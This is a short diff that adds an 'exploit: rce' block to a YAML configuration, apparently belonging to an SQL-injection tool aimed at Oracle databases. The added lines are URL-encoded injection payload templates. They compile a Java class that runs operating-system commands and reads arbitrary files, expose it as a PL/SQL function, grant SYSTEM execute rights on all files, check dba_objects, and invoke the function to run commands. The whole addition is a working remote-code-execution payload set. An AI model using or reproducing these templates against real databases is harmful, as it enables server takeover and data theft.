@@ -168,6 +168,19 @@ resource:
     field: trim(to_char(${field.value}))
     concat: "|| '%7f' ||"
 
+ exploit: |
+  rce:
+   dropSource: ; drop java source "%s";
+   dropFunc: ; drop function %s;
+   addSource: |
+    ; BEGIN%%0aEXECUTE IMMEDIATE 'create or replace and compile java source named "%s" as import java.io.*; public class %s{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = "";while ((stemp = myReader.readLine()) != null) str %%2B= stemp %%2B "\\n";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = "";while((stemp = myReader.readLine()) != null) str %%2B= stemp %%2B "\\n";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';%%0aEND;
+   addFunc: |
+    ; BEGIN%%0aEXECUTE IMMEDIATE 'create or replace function %s(p_cmd in varchar2) return varchar2 as language java name ''%s.runCmd(java.lang.String) return String'';';%%0aEND;
+   grant: |
+    ; BEGIN%0adbms_java.grant_permission('SYSTEM', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');%0aEND;
+   confirm: SELECT object_name||'%s' FROM dba_objects WHERE object_name like '%s' and ROWNUM <= 1
+   runCmd: SELECT %s('%s')||'%s' FROM dual
+
 strategy:
  configuration:
   slidingWindow: |
